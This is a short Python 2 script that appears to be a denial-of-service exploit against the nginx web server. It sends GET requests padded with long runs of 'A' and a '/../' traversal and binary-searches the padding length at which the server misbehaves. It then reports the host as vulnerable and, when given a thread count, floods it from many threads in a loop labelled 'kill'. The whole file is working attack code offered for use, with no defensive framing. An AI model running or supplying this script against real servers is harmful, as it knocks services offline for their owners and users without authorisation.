#!/usr/bin/env python
import sys,httplib,threading,time
size=0
if len(sys.argv) < 2:
    print "usage %s host thread [if thread null, only test]" %(sys.argv[0])
    sys.exit()

host=sys.argv[1]
thread=0
if len(sys.argv) > 2 :
    thread=sys.argv[2]

def get_body_size(host,size):
    try:
        h1 = httplib.HTTPConnection(host, 80)
        h1.request("GET", "/"+"".ljust(size,"A")+"/../BBBBB HTTP/1.1\r\n\r\n")
        res=h1.getresponse()
        if res.getheaders():
            return -1
        else:
            return 1

    except Exception, e: 
        return 0



def run_in_thread(fn):
    def run(*k, **kw):
        t = threading.Thread(target=fn, args=k, kwargs=kw)
	t.start()
    return run

@run_in_thread 
def kill(host,size, work=2134):
    try:
        h1 = httplib.HTTPConnection(host, 80)
        h1.request("GET", "/"+"".ljust(size,"A")+"/../BBBBB HTTP/1.1\r\n\r\n")
        h1.close()
    except Exception, e: print e 

print "try do ddos "+host

sys.stdout.write("get body_size")

step=1000
while 1:
    ret = ""
    while 1:
        ret = get_body_size(host,size)
        time.sleep(0.1)
        if size > 10000:
            print ""
            print "Nginx Patched",size
            sys.exit()
        if ret >= 0:
            break
        size+=step
    if step == 1:
	time.sleep(1)
        ret = get_body_size(host,size)
        if ret == 0:
    	    break
	size-=step
    else:
	size-=step
	step/=10
	size+=step

print " = "+str(size)

print "sorry, your ngx is vulnerable"
if not thread:
    sys.exit()

sys.stdout.write("kill ")
counter=0

while 1:
    try:
	while threading.activeCount() > thread: time.sleep(0.01)
        kill(host,size)
	counter+=1
	if counter > 100:
	    sys.stdout.write(".")
	    sys.stdout.flush()
	    counter=0
    except KeyboardInterrupt:
	print "ctrl+c, wait to thread died"
	break
	
    except Exception, e: print e
